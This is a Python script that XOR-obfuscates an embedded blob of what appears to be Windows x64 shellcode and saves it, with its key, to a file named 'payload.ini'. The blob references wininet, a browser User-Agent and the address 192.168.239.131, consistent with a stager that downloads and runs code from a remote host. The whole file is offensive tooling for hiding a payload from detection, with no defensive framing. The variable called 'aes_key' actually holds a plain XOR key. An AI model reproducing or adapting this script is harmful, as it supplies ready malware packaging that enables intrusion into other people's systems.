import os

def generate_key():
    return os.urandom(16)

def xor_encrypt(data, key):
    encrypted_data = bytearray(data)
    key_len = len(key)
    
    for i in range(len(encrypted_data)):
        encrypted_data[i] ^= key[i % key_len] 

    return encrypted_data

def save_to_file(file_path, key, encrypted_data):
    with open(file_path, 'wb') as file:
        file.write(key)  
        file.write(encrypted_data)  

if __name__ == "__main__":
    file_path = "payload.ini"
    binary_data = b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x6f\x59\x4a\x4b\x00\x01\x4d\xcc\x33\x40\x0c\x70\xf9\xab\xf9\xc9\xc8\xa8\xc0\x29\xe3\xe2\xe8\x51\x54\xa4\xfe\xa0\x22\x29\xcb\xc7\x48\x50\x61\x01\xfd\x50\x4f\xbe\x1b\xcb\x66\x5b\x34\x69\x2e\x66\x70\xca\x45\x3b\xeb\xe1\x9f\xdb\x38\xfb\x5f\xd4\x2e\x33\x80\xf3\x77\xb5\xc9\x5d\x68\x9b\x46\x55\xc1\xf7\x33\xbe\x80\xad\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x58\x41\x29\x0d\x0a\x00\x5e\x54\xc9\xf8\x2e\xca\x15\x21\xce\x5e\x28\x46\x5f\x63\xfd\xa9\xe2\x78\xc2\xf8\x56\xc9\x05\x54\xc9\xf4\xc2\x6c\x58\x22\x11\x03\x77\x57\x6e\xd6\x18\x54\x71\x4a\xc9\x50\xb8\x13\x81\x12\x3d\x88\x54\x4f\x31\xf6\x95\x92\xa8\x1b\x3f\xad\xd8\x4a\x23\x5f\xae\x14\x9c\x73\xbe\xf8\x71\x27\xed\xd9\xdf\xf8\x84\x2a\xbe\xb4\xb7\x5b\x72\xe3\x5c\xd6\xf2\xcc\x9a\xbb\xe4\x43\xd4\x65\x0b\xa8\x8d\x24\xd1\x0b\x36\x39\x03\x00\xaf\x07\xf0\x95\x10\xf7\xe0\x0e\x59\xb6\x86\x80\x82\x7d\xb2\xb8\x94\x5b\xac\x2b\xb1\xd9\x4c\xc7\x11\xcc\x6a\x94\xcd\x2f\x97\xa8\x51\xc5\x99\x61\x77\xab\xaa\x2b\xe9\xea\x5e\xf0\xe5\x31\xe6\x4c\xe6\x75\xcf\x9f\xf2\x7f\xca\x4e\x0a\x20\xe7\x11\xfe\x15\xdc\x11\xc6\xd8\x8e\x4c\x4d\x7c\xac\x87\x9e\xd9\xc6\x4f\xc9\x25\x26\x09\xb5\x9a\xfd\x51\x82\xba\x99\xb7\xa8\x97\x0e\xf6\x4c\x4e\x83\x3e\x84\x9e\x40\xf8\x01\x53\x7c\xef\xf5\xd2\xdc\x62\x87\x44\x2f\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x33\x39\x2e\x31\x33\x31\x00\x00\x01\x86\xa0"

    aes_key = generate_key()
    encrypted_data = xor_encrypt(binary_data, aes_key)
    save_to_file(file_path, aes_key, encrypted_data)

